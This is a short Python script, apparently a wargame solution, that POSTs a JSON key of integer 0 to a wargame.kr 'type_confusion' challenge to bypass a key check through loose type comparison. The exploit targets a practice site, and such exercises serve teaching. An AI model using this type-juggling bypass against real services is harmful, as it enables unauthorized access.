import requests, json

url = 'http://wargame.kr:8080/type_confusion/'
param = {'json': json.dumps({'key':0})}
response = requests.post(url=url, data=param)
print(response.text)